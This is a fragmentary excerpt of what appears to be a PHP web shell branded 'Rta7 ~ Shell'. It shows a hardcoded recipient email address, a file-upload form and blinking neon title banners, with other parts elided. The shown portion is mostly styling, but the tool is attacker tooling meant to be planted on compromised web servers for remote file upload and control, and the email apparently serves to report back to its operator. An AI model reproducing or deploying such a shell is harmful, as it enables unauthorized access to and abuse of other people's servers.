...
$to_email = 'thoriqmustaqim170@gmail.com';
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  Rta7 ~ Shell &lt/&gt; </font></center>
          <br>      
...
<center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #000 , 0px 0px 20px #000;font-family:Kelly Slab;">&lt;/&gt;  rta7 ~ Shell &lt;/&gt; </font></center>
<style>
body{
